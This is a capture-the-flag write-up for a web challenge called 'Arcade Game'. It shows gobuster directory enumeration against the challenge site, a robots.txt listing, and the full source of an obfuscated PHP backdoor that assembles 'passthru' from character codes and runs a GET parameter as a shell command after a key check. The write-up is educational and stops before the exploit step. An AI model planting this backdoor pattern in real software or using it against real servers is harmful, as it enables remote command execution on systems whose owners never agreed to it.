# Challenge Name: Arcade Game


![date](https://img.shields.io/badge/date-17.04.2022-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![category](https://img.shields.io/badge/category-WEB-blueviolet.svg)   
![value](https://img.shields.io/badge/value-150-blue.svg)  


## Description

A group of hackers succeeded to own our lovely arcade machine, till now we have no idea how or when but we are sure that they will come back, due to our analysis we think there's a backdoor, try to find it for us and read the flag.

[https://thnbdarija-arcade.chals.io/](https://thnbdarija-arcade.chals.io/)

_Author : EddieMora_


## Detailed solution  

Start by checking the website 

![image](https://user-images.githubusercontent.com/72421091/163740676-92c18d66-4575-4fbf-b341-cde1bbf0c4f7.png)

Source page has nothing intersting

Let's check for known files and do some directory bruteforcing 

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/big.txt -t 20 -u https://thnbdarija-arcade.chals.io/ -e php,txt,js
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://thnbdarija-arcade.chals.io/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/04/17 04:55:49 Starting gobuster in directory enumeration mode
===============================================================
https://thnbdarija-arcade.chals.io/.htpasswd            (Status: 403) [Size: 291]
https://thnbdarija-arcade.chals.io/.htaccess            (Status: 403) [Size: 291]
https://thnbdarija-arcade.chals.io/README               (Status: 200) [Size: 377]
https://thnbdarija-arcade.chals.io/css                  (Status: 301) [Size: 338][--> http://thnbdarija-arcade.chals.io/css/]
https://thnbdarija-arcade.chals.io/img                  (Status: 301) [Size: 338][--> http://thnbdarija-arcade.chals.io/img/]
https://thnbdarija-arcade.chals.io/js                   (Status: 301) [Size: 337][--> http://thnbdarija-arcade.chals.io/js/]
https://thnbdarija-arcade.chals.io/robots.txt           (Status: 200) [Size: 485]             
https://thnbdarija-arcade.chals.io/server-status        (Status: 403) [Size: 291]             
                                                                                                                                   
===============================================================
2022/04/17 04:58:26 Finished
===============================================================

```

- https://thnbdarija-arcade.chals.io/robots.txt the only accesible files are /README and /hint.txt
```
User-agent: Applebot
Disallow: /ajax/
Disallow: /album.php
Disallow: /checkpoint/
Disallow: /contact_importer/
Disallow: /dialog/
Disallow: /fbml/ajax/dialog/
Disallow: /feeds/
Disallow: /file_download.php
Disallow: /job_application/
Disallow: /l.php
Disallow: /moments_app/
Disallow: /p.php
Disallow: /photo.php
Disallow: /photos.php
Disallow: /plugins/
Disallow: /share.php
Disallow: /share/
Disallow: /sharer.php
Disallow: /sharer/
Disallow: /tr/
Disallow: /tr?
Disallow: /hint.txt
```

- https://thnbdarija-arcade.chals.io/README it shows the source code for a backdoor 

```php
<?php
$X = chr(0x73);
$R = chr(0x72);
$F = chr(0x75);

$cGFzc3dvcmQ = "b02dc9b178659a6ea480d72c94713469"; //password123@!
$owner = "logic";

//flag{try_h4rd3r_1337}

$B = chr(0x61);
$E = chr(0x68);
$D = chr(0x74);
$A = chr(0x70);

$hook = $A.$B.$X.$X.$D.$E.$R.$F;

if($cGFzc3dvcmQ === md5($_GET['key']) && $owner === $_GET['hint'])
{
  $hook($_GET['zip']);
}
else
{
  die();
}
```
$hook is the `passthru` function 
